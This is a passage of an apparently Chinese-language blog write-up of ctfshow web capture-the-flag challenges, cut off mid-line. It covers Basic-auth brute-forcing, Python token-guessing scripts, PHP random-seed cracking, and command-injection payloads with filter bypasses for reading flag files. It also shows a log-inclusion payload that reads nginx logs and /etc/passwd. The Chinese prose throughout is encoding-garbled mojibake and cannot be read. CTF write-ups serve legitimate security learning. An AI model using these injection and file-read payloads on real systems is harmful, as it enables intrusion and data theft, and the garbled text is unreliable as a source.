href="#web72">web72</a></li><li><a href="#web73">web73</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">æ–‡ä»¶åŒ…å«</a><ul><li><a href="#web80">web80</a></li><li><a href="#web83">web83</a></li><li><a href="#web87">web87</a></li></ul></li><li><a href="#php%E7%89%B9%E6%80%A7">phpç‰¹æ€§</a><ul><li><a href="#web89">web89</a></li><li><a href="#web90">web90</a></li><li><a href="#web91">web91</a></li><li><a href="#web93">web93</a></li><li><a href="#web94">web94</a></li><li><a href="#web97">web97</a></li><li><a href="#web99">web99</a></li><li><a href="#web100">web100</a></li><li><a href="#web105">web105</a></li><li><a href="#web108">web108</a></li><li><a href="#web109">web109</a></li><li><a href="#web110">web110</a></li><li><a href="#web111">web111</a></li><li><a href="#web112">web112</a></li><li><a href="#web113">web113</a></li><li><a href="#web123">web123</a></li><li><a href="#web127">web127</a></li><li><a href="#web129">web129</a></li><li><a href="#web131">web131</a></li><li><a href="#web134">web134</a></li><li><a href="#web136">web136</a></li><li><a href="#web141">web141</a></li><li><a href="#web147">web147</a></li><li><a href="#web149">web149</a></li><li><a href="#web150">web150</a></li><li><a href="#web150plus">web150plus</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">æ–‡ä»¶ä¸Šä¼ </a><ul><li><a href="#web153">web153</a></li><li><a href="#web156">web156</a></li><li><a href="#web157">web157</a></li><li><a href="#web-159">web 159</a></li><li><a href="#web-160">web 160</a></li><li><a href="#web162">web162</a></li><li><a href="#web-164">web 164</a></li><li><a href="#web-165">web 165</a></li><li><a href="#web166">web166</a></li><li><a href="#web167">web167</a></li><li><a href="#web-168">web 168</a></li><li><a href="#web169">web169</a></li></ul></li><li><a href="#sql-%E6%B3%A8%E5%85%A5">SQL æ³¨å…¥</a><ul><li><a href="#web171">web171</a></li><li><a href="#web172">web172</a></li><li><a href="#web174">web174</a></li><li><a href="#web175">web175</a></li><li><a href="#web176">web176</a></li><li><a href="#web177">web177</a></li><li><a href="#web179">web179</a></li><li><a href="#web180">web180</a></li><li><a href="#web183">web183</a></li><li><a href="#web184">web184</a></li><li><a href="#web185">web185</a></li><li><a href="#web187">web187</a></li><li><a href="#web-188">web 188</a></li><li><a href="#web189">web189</a></li><li><a href="#web190">web190</a></li><li><a href="#web191">web191</a></li><li><a href="#web192">web192</a></li><li><a href="#web193">web193</a></li><li><a href="#web195">web195</a></li><li><a href="#web196">web196</a></li><li><a href="#web197">web197</a></li><li><a href="#web198">web198</a></li><li><a href="#web-201">web 201</a></li><li><a href="#web202">web202</a></li><li><a href="#web203">web203</a></li><li><a href="#web-204">web 204</a></li><li><a href="#web-205">web 205</a></li><li><a href="#web206">web206</a></li><li><a href="#web207">web207</a></li><li><a href="#web-207">web 207</a></li><li><a href="#web209">Web209</a></li><li><a href="#web210">web210</a></li><li><a href="#web212">Web212</a></li><li><a href="#web213">web213</a></li><li><a href="#web214">web214</a></li><li><a href="#web-215">web 215</a></li><li><a href="#web-216">web 216</a></li><li><a href="#web-217">web 217</a></li><li><a href="#web218">web218</a></li><li><a href="#web220">web220</a></li><li><a href="#web221">web221</a></li><li><a href="#web222">web222</a></li><li><a href="#web223">web223</a></li><li><a href="#web225">web225</a></li><li><a href="#web226">web226</a></li><li><a href="#web227">web227</a></li></ul></li></ul></li><li><a href="#%E6%84%9A%E4%BA%BA%E8%8A%82%E6%9D%AF">æ„šäººèŠ‚æ¯</a><ul><li><a href="#web">WEB</a><ul><li><a href="#easy_signin">easy_signin</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="webå…¥é—¨">WEBå…¥é—¨</span></h1><h3><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h3><h4><span id="web05">web05</span></h4><p>phpsæ³„éœ²ï¼Œphpså­˜æ”¾ç€php<a href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">æºç </a>,å¯é€šè¿‡å°è¯•è®¿é—®&#x2F;index.phpsè¯»å–,æˆ–è€…å°è¯•æ‰«æå·¥å…·æ‰«æè¯»å–ã€‚</p><h4><span id="web10">web10</span></h4><p>flagä¿¡æ¯è—åœ¨dnsè®°å½•é‡Œé¢ï¼Œä½¿ç”¨å‘½ä»¤</p><p><a href="http://dbcha.com/">åŸŸåæŸ¥è¯¢</a></p><h4><span id="web12">web12</span></h4><ul><li><p>æœ‰æ—¶å€™è®¿é—®è·¯å¾„åœ¨*&#x2F;robots.txt*é‡Œé¢</p></li><li><p>å¸¸è§çš„ç®¡ç†å‘˜é¡µé¢è·¯å¾„ï¼š</p><ul><li>&#x2F;admin.php</li><li>&#x2F;admin</li></ul></li></ul><h4><span id="web13">web13</span></h4><p>é¢˜ç›®æç¤ºäº†è¦æŸ¥çœ‹æ–‡æ¡£ï¼Œf12ç²—ç•¥çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡ä»€ä¹ˆçº¿ç´¢ã€‚</p><p>é€šè¿‡dirsearchä¹Ÿæ‰«ä¸åˆ°ï¼Œçœ‹äº†ä¸€ä¸‹æç¤ºï¼Œè¯´æ˜¯è¦æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œç„¶åæŸ¥æ‰¾ä¸€ä¸‹documentå…³é”®å­—ï¼Œæœç„¶å‘ç°äº†ä¸ªdocument.pdfã€‚</p><h4><span id="web14">web14</span></h4><p>çœ‹äº†åŠå¤©æºç ä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œçœ‹äº†ä¸€ä¸‹robots.txtä¹Ÿæ²¡æœ‰ï¼Œå†ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸ªeditorç›®å½•ï¼Œè®¿é—®é“¾æ¥å‘ç°äº†ä¸€ä¸ªç¼–è¾‘å™¨ã€‚</p><p>ç„¶ååˆ©ç”¨ç¼–è¾‘å™¨ä¸Šä¼ çš„åŠŸèƒ½ï¼Œå‘ç°flagæ–‡ä»¶<code>editor/attached/file/var/www/html/nothinghere/fl000g.txt</code></p><p>æœ€åè®¿é—®**&#x2F;nothinghere&#x2F;fl000g.txt**å³å¯</p><h4><span id="web15">web15</span></h4><p>è¦æœ‰ç¤¾å·¥çš„æ„è¯†ï¼Œæœ‰é‚®ç®±çš„ä¿¡æ¯å°±å¯ä»¥å»æŸ¥å…¶ä»–ä¿¡æ¯ã€‚</p><h4><span id="web16">web16</span></h4><p>phpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚ urlåç¼€åæ·»åŠ &#x2F;tz.php ç‰ˆæœ¬æ˜¯é›…é»‘PHPæ¢é’ˆï¼Œç„¶åæŸ¥çœ‹phpinfoæœç´¢flag</p><ul><li>chromeçš„wappalyzerå¯ä»¥æŸ¥çœ‹ç½‘é¡µçš„æ¡†æ¶å’Œè¯­è¨€ï¼Œå¯ä»¥å‘ç°æ˜¯php</li></ul><h4><span id="web20">web20</span></h4><ul><li>accessæ•°æ®åº“åœ¨&#x2F;db&#x2F;db.mdb</li></ul><h3><span id="çˆ†ç ´">çˆ†ç ´</span></h3><h4><span id="web21">web21</span></h4><p>BurpSuitå¯ä»¥æœ‰å¤šç§åšæ³•ï¼š</p><p>æˆ‘ä»¬éšä¾¿è¾“å…¥è´¦å·å¯†ç æŠ“åŒ…æ—¶å€™å‘ç°Authorizationä¸­æ˜¯ä»¥base64è¿›è¡ŒåŠ å¯†çš„ï¼Œè§£å¯†ä¸ºadmin:123ï¼Œå¯èƒ½è¿™æ ·è¿˜æ¯”è¾ƒéš¾çœ‹å‡ºæ¥ï¼Œå¯ä»¥æŠŠå¯†ç åŠ é•¿ä¸€ç‚¹è¯•è¯•çœ‹ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>02cc98c2-f4b7-41b3-8b16-7b9a96655edb.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46MTIz</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><ul><li><p>ç¬¬ä¸€ç§ï¼Œè´¦å·å¯†ç åˆ†å¼€ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic Â§Â§Â§Â§</span><br></pre></td></tr></table></figure><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162915401.png" alt="image-20230423162915401"></p></li></ul><p>â€‹     <img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162935303.png" alt="image-20230423162935303"></p><p>ç¬¬äºŒä¸ªä½ç½®åŠ å…¥å¯†ç æœ¬ï¼Œç„¶åå…¶ä»–åŒç†ã€‚</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162626843.png" alt="image-20230423162626843"></p><ul><li><p>æ–¹æ³•äºŒï¼šå¯ä»¥ç›´æ¥ä¿ç•™admin:çš„base64ç¼–ç ï¼Œç„¶åæ”¾åœ¨payloadå‰é¢</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46Â§Â§</span><br></pre></td></tr></table></figure></li></ul><p>â€‹å› æ­¤ï¼Œåªéœ€è¦ä¸€ä¸ªsimple listå³å¯</p><ul><li>æ–¹æ³•ä¸‰ï¼šæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<em>payload type &#x3D; Custom iterator</em>æ„é€ ä¸‰æ¬¡å‚æ•°<ul><li>ç¬¬ä¸€æ¬¡è¾“å…¥admin</li><li>ç¬¬äºŒæ¬¡è¾“å…¥:</li><li>ç¬¬ä¸‰æ¬¡å¯†ç å­—å…¸</li></ul></li></ul><h4><span id="web22">web22</span></h4><p><a href="http://z.zcjun.com/">å­åŸŸåçˆ†ç ´</a></p><h4><span id="web23">web23</span></h4><p>é˜…è¯»phpæºç ï¼Œç„¶åå†™pythonè„šæœ¬</p><ul><li><strong>MD5åŠ å¯†</strong>ï¼šäº§ç”Ÿå‡ºä¸€ä¸ª128ä½ï¼ˆ16å­—èŠ‚ï¼‰çš„æ•£åˆ—å€¼ï¼ˆhash valueï¼‰ï¼Œç”¨äºç¡®ä¿ä¿¡æ¯ä¼ è¾“å®Œæ•´ä¸€è‡´ã€‚ç”Ÿæˆç»“æœæ˜¯å›ºå®šçš„128å­—èŠ‚ï¼Œé€šå¸¸ç”¨ä¸€ä¸ª32ä½çš„16è¿›åˆ¶å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</li><li><strong>PHP</strong>ï¼šsubstr()ã€intval()ã€ä»¥åŠä»£ç åˆ†æ</li></ul><p>ç¬¬ä¸€ç§æ–¹å¼ï¼Œå­—æ¯åŠ æ•°å­—ç»„åˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://7f0d474e-c019-4af7-8f95-b02664aa0411.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        k = (<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3ä¸­å¿…é¡»è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">        token = hashlib.md5(k).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">                right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">                <span class="keyword">if</span> left == right:</span><br><span class="line">                    <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)&#125;</span>&#x27;</span>).text)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹å¼ï¼Œçº¯æ•°å­—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://61535773-6957-4813-b084-0451f6607922.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    k = <span class="built_in">str</span>(j).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3ä¸­å¿…é¡»è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">    token = hashlib.md5(k).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">            right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">            <span class="keyword">if</span> left == right:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;j&#125;</span>&#x27;</span>).text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h4><span id="web25">web25</span></h4><ul><li><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œéƒ½æ˜¯åˆ©ç”¨phpéšæœºæ•°çš„çˆ†ç ´æ”»å‡»ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰ç»™ç§å­ï¼Œå› æ­¤éœ€è¦éœ€è¦ä½¿ç”¨å·¥å…· <a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a> ã€‚ä¸“é—¨ç”¨æ¥è·‘mt_srand()ç§å­å’Œ mt_rand()éšæœºæ•°ã€‚</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/509478bc7d684369b08ac08f664cf67b.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç§å­æ¶‰åŠåˆ°flagï¼Œä¸èƒ½ç›´æ¥æ±‚åˆ°</span><br><span class="line"><span class="keyword">if</span>((!<span class="variable">$rand</span>)) è¦ä½¿è¿™ä¸ªä¸ºçœŸï¼Œå°±è¦è®© <span class="variable">$rand</span>=<span class="number">0</span> ï¼Œ</span><br><span class="line">è€Œ <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()) </span><br><span class="line">æ‰€ä»¥è¦å¾—åˆ°éšæœºæ•°æ‰èƒ½æ„é€  <span class="variable">$r</span>=<span class="variable">$mt_rand</span>() ã€‚</span><br></pre></td></tr></table></figure><p>å…ˆä¼ å‚<code>/?r=0</code>è·å–ç”Ÿæˆéšæœºæ•°çš„è´Ÿå€¼ã€‚</p><p>å†è¿›è¡Œ<code>./php_mt_seed éšæœºæ•°</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1267174464</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span>=<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠr&#x3D;1267174464å’Œtokenæ”¾åˆ°cookieä¸­ä¼ å…¥ï¼Œå³å¯è·å–flagã€‚</p></li></ul><h4><span id="web28">web28</span></h4><ul><li><p>ä¸€å¼€å§‹ä¸‰ä¸ªä½ç½®ä¸€èµ·çˆ†ç ´ï¼Œæ²¡æˆåŠŸï¼Œçœ‹ç½‘ä¸Šwp</p><p>å¦‚æœä¿®æ”¹æœ€åçš„2.txtä¼šè¢«æ— é™é‡å®šå‘ï¼Œä¸åˆ é™¤2.txtåªä¿®æ”¹å‰é¢çš„0å’Œ1ä¾æ—§ä¼šè¢«æ— é™é‡å®šå‘ã€‚</p></li><li><p>å› æ­¤åˆ æ‰æœ€å2.txtï¼Œç”¨é›†æŸç‚¸å¼¹æ¨¡å¼çˆ†ç ´å‰ä¸¤ä¸ªæ•°å­—å³å¯ã€‚</p></li></ul><h3><span id="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</span></h3><h4><span id="å‘½ä»¤æ‰§è¡Œæ–¹æ³•æ±‡æ€»">å‘½ä»¤æ‰§è¡Œæ–¹æ³•æ±‡æ€»</span></h4><p>ä½†æ˜¯å‡å¦‚æˆ‘ä»¬å¹¶ä¸çŸ¥é“flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ<br>æ–°æ‰‹å¯ä»¥ç­‰æ–‡ä»¶åŒ…å«éƒ¨åˆ†å­¦è¿‡æ¥å†å­¦ã€‚ æˆ‘ä»¬é€šè¿‡å“åº”å¤´ï¼Œå‘ç°æ˜¯nginxï¼Œé»˜è®¤nginxæ—¥å¿—æ–‡ä»¶åœ¨&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log ç»“åˆè¿™é‡Œçš„includeï¼Œæ„é€ å¦‚ä¸‹è¯­å¥ï¼Œä¹Ÿå¯ä»¥å°è¯•å…ˆ&#x2F;etc&#x2F;passwdï¼Œç¡®è®¤çš„ç¡®å¯ä»¥åŒ…å«ã€‚<code> http://dfa0bafe-3571-4a4a-9f0a-3766fb5a0a69.challenge.ctf.show/?c=include$_GET[a\]?%3E&amp;a=../../../../var/log/nginx/access.log</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>() <span class="comment">#æ˜¯PHPä¸­ä¸€ä¸ªå¸¸ç”¨çš„å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å˜é‡æ˜¯å¦å·²ç»è¢«è®¾ç½®å¹¶ä¸”é NULLã€‚å¦‚æœç»™å®šçš„å˜é‡å­˜åœ¨ä¸”å…¶å€¼ä¸ä¸º NULLï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› false</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>() <span class="comment">#æ˜¯PHPä¸­ç”¨äºæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨ç»™å®šçš„å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ¨¡å¼åŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œè¿”å› 1ï¼Œå¦åˆ™è¿”å› 0ã€‚è¯¥å‡½æ•°éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼šæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼å’Œè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚è¿˜å¯ä»¥ä¼ é€’ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå°†åŒ¹é…ç»“æœå­˜å‚¨åˆ°å…¶ä¸­ã€‚</span></span><br><span class="line"><span class="keyword">eval</span>() <span class="comment">#å‡½æ•°ç”¨äºå°†å­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚åœ¨æ‰§è¡Œæ—¶ï¼Œè¯¥å‡½æ•°å°†ä¼ é€’çš„å­—ç¬¦ä¸²ä½œä¸º PHP ä»£ç æ¥æ‰§è¡Œã€‚</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°èƒ½è¢«å½“ä½œphpä»£ç æ‰§è¡Œï¼Œåˆ™æˆ‘ä»¬ä½¿ç”¨ä¸€äº›ç³»ç»ŸæŒ‡ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>tacå¯ä»¥ç›´æ¥çœ‹åˆ°ï¼Œcatéœ€è¦åœ¨f12æºç é‡Œé¢çœ‹</li></ul><blockquote><p>ç©ºæ ¼å¯ä»¥ç”¨tab%09æ¥ç»•è¿‡</p><p>&lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ ${IFS}ã€$IFSã€$IFS$1</p><p>å¯¹äº;çš„è¿‡æ»¤å¯ä»¥ä½¿ç”¨?&gt;</p><p>%0a æ¢è¡Œç¬¦ä»£æ›¿ ;</p></blockquote><ul><li><p>æ–¹æ³•ä¸€ï¼šæ‹¼æ¥</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># urlç¼–ç åä½¿ç”¨%5cæ·»åŠ åˆ°flagä¸­</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">5</span>cag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># urlç¼–ç åä½¿ç”¨$9æ·»åŠ åˆ°flagä¸­</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$<span class="number">9</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># è¿˜å¯ä»¥ä½¿ç”¨&#x27;&#x27;å’Œ&quot;&quot;æ¥æ‹¼æ¥flag ä¾‹å¦‚ fl&#x27;&#x27;ag ï¼ˆç¼–ä¸ç¼–ç éƒ½è¯•è¯•çœ‹ï¼‰</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">22</span>%<span class="number">22</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ä½¿ç”¨ç‰¹æ®Šç¬¦å·$@</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$@ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># è¿‡æ»¤catåä¹Ÿå¯ä»¥é€šè¿‡åŠ æ–œæ è¾¾åˆ°ç»•è¿‡çš„æ–¹æ³• ca\t</span></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šä½¿ç”¨é€šé…ç¬¦</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨* cat fla*</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla*%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ä½¿ç”¨? cat fla?.php</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla%<span class="number">3</span>F%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ?å¯ä»¥å‡ºç°ä»»æ„æ¬¡</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>fla?.???%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åå¼•å·</p><ul><li>åå¼•å·çš„ä½œç”¨å°±æ˜¯å°†åå¼•å·å†…çš„Linuxå‘½ä»¤å…ˆæ‰§è¡Œï¼Œç„¶åå°†æ‰§è¡Œç»“æœèµ‹äºˆå˜é‡ã€‚</li><li>ç”± <code>&#39;&#39;</code> ç¬¦å·å¹¶ä¸ä¼šå½±å“å‘½ä»¤çš„æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ’å…¥è¿™äº›ç¬¦å·æ¥ç»•è¿‡ã€‚åœ¨linuxä¸­å¯ä»¥ä½¿ç”¨ â€™ æ¥ç»•è¿‡ï¼Œæ¯”å¦‚ flâ€™â€™ag å°±ç­‰æ•ˆäº flagã€‚</li><li><strong>echo &#96;&#96; å’Œ system(â€˜â€™) ç­‰ä»·</strong></li></ul>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?c=<span class="built_in">echo</span><span class="variable">%20`tac%</span><span class="number">20</span>fl<span class="variable">%27%</span><span class="number">27</span>ag.php`;</span><br><span class="line"># nl 